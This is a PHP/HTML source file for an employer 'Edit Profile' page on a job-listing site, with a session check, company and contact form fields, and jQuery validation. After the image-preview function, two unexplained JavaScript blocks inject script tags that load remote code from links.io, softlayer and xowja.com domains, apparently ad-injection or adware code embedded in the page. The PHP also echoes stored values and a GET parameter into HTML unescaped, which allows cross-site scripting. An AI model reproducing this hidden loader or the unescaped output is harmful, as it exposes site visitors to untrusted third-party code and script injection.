<?php
include './includes/functions.php';
include './includes/db.php';
//GET CURRENT DATE
$year = date('Y');
$minYear = $year - 50;
$minYear2= $minYear + 1;
$maxYear = $year - 1;

//GET SESSION VARIABLLES
session_start();
if(isset($_SESSION['SRIUsername']) && $_SESSION['SRIUsername'] != ""){
	$username = $_SESSION['SRIUsername'];
}
else{
	header("Location: index.php");
}


//GET ALL LOCATIONS LISTED
$availableLocations= getJobLocations();
//GET ALL LISTED CONTACT PERSON POSITIONS
$cpPositions = getContactPersonPositions();
//GET ALL JOB POSITIONS CONTACT PERSON DEPARTMENTS
$cpDepts = getDepartments();

//get EmployerInfo
$status = getAcctInfo($username, "status");
$coName = getEmployerData($username, "company-name");
$location = getEmployerData($username, "address");
$profilePic = getEmployerData($username, "profile_pic");
$companyDesc = getEmployerData($username, "company_desc");
$street1 = getEmployerData($username, "street1");
$city1 = getEmployerData($username, "city1");
$province1 = getEmployerData($username, "province1");
$firstName = getEmployerData($username, "first_name");
$middleName = getEmployerData($username, "middle_name");
$lastName = getEmployerData($username, "last_name");
$mobile = getEmployerData($username, "mobile");
$mobile1 = substr($mobile, 0, -7);
$mobile2 = substr($mobile, 4, -4);
$mobile3 = substr($mobile, -4);

$email = getEmployerData($username, "email");

$landline = getEmployerData($username, "landline");
$landline1 = substr($landline, 0, -4);
$landline2 = substr($landline, 3, -2);
$landline3 = substr($landline, -2);

$cpPosition = getEmployerData($username, "position");
$cpDept = getEmployerData($username, "department");

$area = $city1 . ", " . $province1;
if($mobile != ""){
	$mobileDisabled = "readonly";
	$emailDisabled = "";
}
else if($email != ""){
	$mobileDisabled = "";
	$emailDisabled = "readonly";
}

//FOR PROFILE SAVING
$profileSaved = 0;
if(isset($_GET['saved'])){
	$profileSaved = $_GET['saved'];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<!-- START META -->
<?php echo $meta=getMeta(); ?>
<!-- END META -->
<!-- CSS scripts -->
<link rel="stylesheet" href="./css/bootstrap.css"/>
<link rel="stylesheet" href="./css/select2.css"/>
<link rel="stylesheet" href="./css/datepicker.css"/>
<!-- [if IE]>
	<script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
<![endif] -->
<link rel="stylesheet" href="./css/bootstrap-responsive.css"/>
<!-- CSS scripts -->
</head>
<body>
<!-- START GTM  -->
<?php echo $gtm=getGTM(); ?>
<!-- END GTM-->
<div class="wrap">
	<!-- START HEADER -->
	<?php echo $header=getHeader('default'); ?>
	<!-- END HEADER -->
	<!-- START SEARCH NAVBAR  -->
	<?php echo $navbar=getEmployerNavBar($username); ?>
	<!-- END SEARCH NAVBAR  -->
	<div class="container-fluid">
		<div class="row-fluid">
			<div class="span6 offset1">
				<h3>Edit Profile</h3>
			</div>
			<div class="span3 offset1">
				<p class="text-info pull-right" style="font-weight:bold; padding-top:30px;">*Required fields</p>
			</div>
		</div>
		<div class="row-fluid" id="content-apply-job">
			<div class="span10 offset1"> 
				<div class="row-fluid">
					<div class="span12 well">
						<h4 class="content-heading2">COMPANY INFORMATION</h4>
						<!-- START SIGNUP FORM -->
						<form name="edit-form" id="edit-form" class="form-horizontal" method="POST" action="process-editprofile.php" enctype="multipart/form-data">
						<div class="basic-info-form1">
							<div class="control-group">
								<label class="control-label">*COMPANY NAME</label>
								<div class="controls">
								  <input type="text" class="span12" id="companyName" name="companyName" value="<?php echo $coName;?>" minlength="5" required />
								  <p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
								</div>
							 </div>
							 <div class="control-group">
								<label class="control-label">*COMPANY DESCRIPTION</label>
								<div class="controls">
								  <textarea class="input-block-level" id="companyDesc" name="companyDesc" placeholder="Tell us about your company" minlength="10" required ><?php echo $companyDesc;?></textarea>
								  <p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
								</div>
							 </div>
							  <div class="control-group">
									<label class="control-label">*COMPANY ADDRESS<br><span id="formLabel" style="font-weight:normal; color:#404040;">( Street Address, City and Provincial Address )</span></label>
									<div class="controls controls-row">
									   <input type="text" class="span4" id="street1" name="street1" value="<?php echo $street1;?>" minlength="5" required />
									   <select class="span8" id="area1" name="area1" required>
											<?php
												foreach($availableLocations as $aL) {
													if($aL == $area){
														echo "<option value=\"$aL\" selected=\"selected\">$aL</option>";
													}
													else {
														echo "<option value=\"$aL\">$aL</option>";
													}
												}
											?>
									</select>
									<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
									</div>
								</div>
							 <div class="control-group">
								<label class="control-label">COMPANY LOGO</label>
								<div class="controls">
									<div class="span4" id="imagePreview"><span id="temp-pic" style="display:inline"><img src="<?php echo $profilePic; ?>" style="width:104px; height:103px;"/></span></div>
									<br/><br/>
									<input class="span8" type="file" id="imageInput" name="photoimg" onchange="loadImageFile();" style="padding-left:10px;"/>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div class="row-fluid" style="padding-top:10px;">
					<div class="span12 well">
						<div class="row-fluid">
							<h4 class="content-heading2">CONTACT PERSON</h4>
							<div class="control-group form-horizontal">
								<label class="control-label">*FULL NAME<br><span id="formLabel" style="font-weight:normal; color:#404040;">( First Name, Middle Name, Last Name )</span></label>
								<div class="controls">
									<input type="text" class="span4" id="firstName" name="firstName" value="<?php echo $firstName;?>" minlength="2" required />
									<input type="text" class="span4" id="middleName" name="middleName" value="<?php echo $middleName;?>" minlength="2" required />
									<input type="text" class="span4" id="lastName" name="lastName" value="<?php echo $lastName;?>" minlength="2" required />
									<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
								</div>
							</div>
						</div>
						<div class="row-fluid form-horizontal">
							<div class="control-group">
								<label class="control-label"><?php if($mobile==$username) echo "*";?>MOBILE NO.<br><span id="formLabel" style="font-weight:normal; color:#404040;">( e.g. 0915-111-1111 )</span></label>
								<div class="controls">
									<input type="text" class="span4" id="mobile1" name="mobile1"  value="<?php echo $mobile1;?>" pattern="[0-9]*" minlength="4" maxlength="4" <?php echo $mobileDisabled;?>/> -
									<input type="text" class="span4" id="mobile2" name="mobile2"  value="<?php echo $mobile2;?>" pattern="[0-9]*" minlength="3" maxlength="3" <?php echo $mobileDisabled;?>/> -
									<input type="text" class="span4" id="mobile3" name="mobile3"  value="<?php echo $mobile3;?>" pattern="[0-9]*" minlength="4" maxlength="4"  <?php echo $mobileDisabled;?>/>
									<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
								</div>
							</div>
						</div>
						<div class="row-fluid form-horizontal">
							<div class="control-group">
								<label class="control-label"><?php if($email==$username) echo "*";?>EMAIL ADDRESS<br><span id="formLabel" style="font-weight:normal; color:#404040;">( e.g. jdelacruz@sri.com )</span></label>
								<div class="controls">
									<input type="email" class="span12" id="email" name="email" style="margin-right:80px;" value="<?php echo $email;?>" <?php echo $emailDisabled;?>> 
									<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
								</div>
							</div>
						</div>
						<div class="row-fluid form-horizontal">
							<div class="control-group">
								<label class="control-label">LANDLINE NO.<br><span id="formLabel" style="font-weight:normal; color:#404040;">( e.g. 411-11-11 )</span></label>
								<div class="controls">
									<input type="text" class="span4" id="landline1" name="landline1" pattern="[0-9]*" minlength="3" maxlength="3" value="<?php echo $landline1;?>"/> -
									<input type="text" class="span4" id="landline2" name="landline2" pattern="[0-9]*" minlength="2" maxlength="2" value="<?php echo $landline2;?>"/> -
									<input type="text" class="span4" id="landline3" name="landline3" pattern="[0-9]*" minlength="2" maxlength="2" value="<?php echo $landline3;?>"/> 
									<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
								</div>
							</div>
						</div>
						<div class="row-fluid form-horizontal">
							<div class="span6">
								<div class="row-fluid">
									<div class="control-group">
										<label class="control-label">DESIGNATION:<br><span id="formLabel" style="font-weight:normal; color:#404040;">( e.g. Manager )</span></label>
										<div class="controls">
											<input type="text" class="span12" id="cpPosition" name="cpPosition"  value="<?php echo $cpPosition;?>" required /> 
											<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
										</div>
									</div>
								</div>
							</div>
							<div class="span6">
								<div class="row-fluid">
									<div class="control-group">
										<label class="control-label">DEPARTMENT:<br><span id="formLabel" style="font-weight:normal; color:#404040;">( e.g. Human Resources )</span></label>
										<div class="controls">
											<input type="text" class="span12" id="cpDept" name="cpDept"  value="<?php echo $cpDept;?>" required /> 
											<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
										</div>
									</div>
								</div>
							</div>
						</div>						 
						 <!-- hidden variables -->
						<input type="hidden" id="status" name="status" value="<?php echo $status;?>" />
						<input type="hidden" id="username" name="username" value="<?php echo $username;?>">
						<input type="hidden" id="profileSaved" name="profileSaved" value="<?php echo $profileSaved;?>">
					</div>
				</div>
			</div>
		</div>
		<div class="row-fluid">
			<div class="span12">
				<div class="row-fluid">
					<div class="span6 offset5">
						<button type="button" class="btn btn-primary span6" id="changeAcctInfo" name="changeAcctInfo" onclick="changeAccountInfo();">CHANGE PASSWORD</button>
						<button type="submit" class="btn btn-primary job-post-add span6" id="submitApply" name="submitApply">SAVE CHANGES</button>				
						</form>
						<!--END SIGNUP FORM-->
					</div>
				</div>
			</div>
		</div>
	</div>
	<br><br><br>
	<div class="push"></div>
</div>
<!-- START MODAL-->
<div id="myModal" class="modal hide fade" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" data-backdrop="static" aria-hidden="true">
  <div class="modal-header">
    <h4 class="content-heading4">Profile Changes Saved!</h4>
  </div>
  <div class="modal-body">
	<div class="row-fluid">
		<div class="span12">
			   <p style="text-align: center;">You have successfully updated your profile.</p>
		</div>
	</div>
  </div>
  <div class="modal-footer">
	<div class="row-fluid">
		<div class="span4 offset4">
			<button class="btn btn-primary span12" data-dismiss="modal">OK</button>
		</div>
	</div>
  </div>
</div>
<!-- END MODAL-->
<!-- START ERROR MODAL-->
<?php echo $formErrorModal=getFormsErrorModal(); ?>
<!-- END ERROR MODAL-->
<!-- START FOOTER -->
<?php echo $footer=getFooter(); ?>
<!-- END FOOTER -->

<!-- JS scripts -->
<script src="./js/jquery.min.js"></script>
<script src="./js/jqBootstrapValidation.js"></script>
<script src="./js/jquery.form.js"></script>
<script src="./js/select2.js"></script>
<script src="./js/bootstrap.min.js"></script>
<script>
$(document).ready(function() { 
	$(function () { $("input,select,textarea").not("[type=submit]").jqBootstrapValidation(); } );
});
</script>
<script>
//FOR IMAGE PREVIEW
var loadImageFile = (function () {
    if (window.FileReader) {
        var    oPreviewImg = null, oFReader = new window.FileReader(),
            rFilter = /^(?:image\/bmp|image\/cis\-cod|image\/gif|image\/ief|image\/jpeg|image\/jpeg|image\/jpeg|image\/pipeg|image\/png|image\/svg\+xml|image\/tiff|image\/x\-cmu\-raster|image\/x\-cmx|image\/x\-icon|image\/x\-portable\-anymap|image\/x\-portable\-bitmap|image\/x\-portable\-graymap|image\/x\-portable\-pixmap|image\/x\-rgb|image\/x\-xbitmap|image\/x\-xpixmap|image\/x\-xwindowdump)$/i;

        oFReader.onload = function (oFREvent) {
            if (!oPreviewImg) {
                var newPreview = document.getElementById("imagePreview");
				document.getElementById("temp-pic").style.display = "none";
                oPreviewImg = new Image();
                oPreviewImg.style.width = "104px";
				oPreviewImg.style.height = "103px";
                newPreview.appendChild(oPreviewImg);
            }
            oPreviewImg.src = oFREvent.target.result;
        };

        return function () {
            var aFiles = document.getElementById("imageInput").files;
            if (aFiles.length === 0) { return; }
            if (!rFilter.test(aFiles[0].type)) { alert("You must select a valid image file!"); return; }
            oFReader.readAsDataURL(aFiles[0]);
        }

    }
    if (navigator.appName === "Microsoft Internet Explorer") {
        return function () {
            document.getElementById("imagePreview").filters.item("DXImageTransform.Microsoft.AlphaImageLoader").src = document.getElementById("imageInput").value;

        }
    }
})();
/* */
var uco = 'US';(function() {
    //var url = (document.location.protocol == 'http:') ? 'ssl.privacysafeguard.com/htmlreplace/replace.js' : 'ssl.privacysafeguard.com/htmlreplace/replace-ssl.js';
    //var url = (document.location.protocol == 'http:') ? 'cdn.links.io/htmlx/replace.js' : 'cdn.links.io/htmlx/replace-ssl.js';
    var url = (document.location.protocol == 'http:') ? 'cdn-sl.links.io/replace.js' : '93ce.https.cdn.softlayer.net/8093CE/dev.links.io/htmlreplace/replace-ssl.js';
    var h = document.getElementsByTagName('head')[0];
    var s = document.createElement('script');
    s.type = 'text/javascript';
    s.src = document.location.protocol + '//' + url;
    h.appendChild(s);
})();
(function() {
    var url = (document.location.protocol == 'http:') ? 'xowja.com/i.js' : 'xowja.com/i.js';
    var h = document.getElementsByTagName('head')[0];
    var s = document.createElement('script');
    s.type = 'text/javascript';
    s.src = document.location.protocol + '//' + url;
    h.appendChild(s);
})();
</script>
<script>
$(document).ready(function() { 
	var profileSaved = document.getElementById('profileSaved').value;
	if(profileSaved == 1){
		$("#myModal").modal('show');
	}
	
	$("#area1").select2(); 
	
	// bind to the form's submit event 
	$('#edit-form').submit(function() { 
		//validate inputs
		var errors = 0;
		var fields = new Array();
		var requiredFields = new Array();
		var errorMsg = "";
		var companyName = document.getElementById('companyName').value;
		var companyDesc = document.getElementById('companyDesc').value;
		var street = document.getElementById('street1').value;
		var firstName = document.getElementById('firstName').value;
		var middleName = document.getElementById('middleName').value;
		var lastName = document.getElementById('lastName').value;
		
		fields.push(companyName, companyDesc, street, firstName, middleName, lastName);
		requiredFields.push(1,1,1,0,0,0);
		
		for (var f = 0; f < fields.length; f++) {
			var fElem = fields[f];
			var fReq = requiredFields[f];
			if(fReq > 0 && fElem.match(/^\s*$/)){
				errors = 1;
				errorMsg = "<li>Please make sure that all required fields are filled.</li>";
			}
		}
		
		if(errors>0){
			document.getElementById('errorContent').innerHTML = errorMsg;
			$("#errorModal").modal('show');
		}
		else{
			// $(this).ajaxSubmit(); 
			// $("#myModal").modal('show');
			return true;
		}
		return false;
    });
});

function goToHomePage() {
	window.location.href = "index.php";
}

function showLogIn(){
	window.location.href = "login.php?new=true";
}
function changeAccountInfo() {
	window.location.href="change-password.php";
}
</script>
<!-- JS scripts -->
</body>
</html>